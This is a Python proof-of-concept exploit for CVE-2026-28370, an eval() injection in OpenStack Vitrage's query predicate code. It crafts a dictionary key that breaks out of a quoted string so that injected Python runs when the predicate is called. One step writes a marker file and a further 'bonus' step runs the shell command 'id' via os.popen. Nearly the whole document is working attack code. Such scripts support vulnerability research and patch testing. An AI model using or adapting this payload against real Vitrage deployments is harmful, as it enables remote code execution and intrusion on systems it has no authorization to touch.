#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OpenStack Vitrage eval() Injection — Key Injection
# CVE            : CVE-2026-28370
# Vendor         : OpenStack
# Product        : Vitrage
# Affected       : All versions before 12.0.1, 13.0.0, 14.0.0, 15.0.0
# Type           : CWE-95 - Eval Injection
# CVSS           : 9.1 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-28370 Vector 2: KEY-based eval() Injection

This variant demonstrates that the vulnerability exists in BOTH the key
and value positions of the query dict. The _evaluable_str() function is
called on both the key and value in _create_query_expression():

    expression = ("item.get('" + _evaluable_str(key) + "')" +
                  operator + _evaluable_str(val))

ATTACK CHAIN:
  1. Craft query dict with single-quote breakout in KEY position
  2. create_predicate() builds expression string and passes to eval()
  3. Injected Python code executes when the lambda predicate is invoked

PREREQUISITES:
  - OpenStack Vitrage < 12.0.1 (or 13.0.0, 14.0.0, 15.0.0)
  - Authenticated access to Vitrage API (or direct function access)

REFERENCES:
  - CVE-2026-28370
  - https://nvd.nist.gov/vuln/detail/CVE-2026-28370
"""

import sys
import os
import json

# ============================================================================
# Color output helpers
# ============================================================================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def info(msg):
    print(f"{CYAN}[*]{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[-]{RESET} {msg}")

def warn(msg):
    print(f"{YELLOW}[!]{RESET} {msg}")


# ============================================================================
# Fake vertex for predicate invocation
# ============================================================================
class FakeVertex:
    def get(self, key):
        return ""


# ============================================================================
# Main
# ============================================================================
def main():
    print(f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════════════╗
║   CVE-2026-28370 Vector 2: KEY-based eval() Injection              ║
╚══════════════════════════════════════════════════════════════════════╝{RESET}
""")

    from vitrage.graph.query import create_predicate

    evidence_dir = "/tmp/poc_evidence"
    os.makedirs(evidence_dir, exist_ok=True)

    marker_file = os.path.join(evidence_dir, "key_injection_proof.txt")
    if os.path.exists(marker_file):
        os.remove(marker_file)

    # ======================================================================
    # KEY injection payload
    #
    # Normal query key "CATEGORY" generates:
    #   item.get('CATEGORY') == 'value'
    #
    # Malicious key "' + INJECTED_CODE + '" generates:
    #   item.get('' + INJECTED_CODE + '') == 'value'
    #
    # The injected code executes when the lambda is invoked.
    # ======================================================================
    marker_content = "CVE-2026-28370 KEY-INJECTION vector confirmed"
    payload_code = f"str(open('{marker_file}','w').write('{marker_content}'))"
    malicious_key = f"' + {payload_code} + '"

    payload = {"==": {malicious_key: "anything"}}

    info("Attack vector: Dictionary KEY injection")
    info(f"Malicious key: {repr(malicious_key[:80])}...")
    info(f"Full payload: {json.dumps(payload)[:120]}...")

    # Step 1: create_predicate calls eval() on the expression string
    info("Calling create_predicate() with key-injected payload...")
    try:
        predicate = create_predicate(payload)
        success("Lambda created successfully via eval()")
    except Exception as e:
        fail(f"create_predicate() failed: {e}")
        return 1

    # Step 2: Invoke the predicate to trigger the injected code
    info("Invoking predicate to trigger injected code...")
    try:
        predicate(FakeVertex())
    except Exception as e:
        warn(f"Predicate raised: {e}")

    # Step 3: Verify
    if os.path.exists(marker_file):
        with open(marker_file, 'r') as f:
            content = f.read()
        success(f"MARKER FILE CREATED: {marker_file}")
        success(f"Contents: '{content}'")
        success("KEY-BASED INJECTION CONFIRMED!")

        # Bonus: execute a command via key injection
        cmd_file = os.path.join(evidence_dir, "key_injection_cmd.txt")
        cmd_code = (
            f"str(open('{cmd_file}','w').write("
            f"__import__('os').popen('id').read()"
            f"))"
        )
        cmd_key = f"' + {cmd_code} + '"
        cmd_payload = {"==": {cmd_key: "x"}}

        info("Bonus: OS command execution via key injection...")
        try:
            pred2 = create_predicate(cmd_payload)
            pred2(FakeVertex())
        except Exception:
            pass

        if os.path.exists(cmd_file):
            with open(cmd_file, 'r') as f:
                cmd_output = f.read()
            success(f"Command output: {cmd_output.strip()}")
            success("OS COMMAND EXECUTION via KEY injection CONFIRMED!")

        return 0
    else:
        fail("Marker file was NOT created — key injection failed")
        return 1


if __name__ == "__main__":
    sys.exit(main())
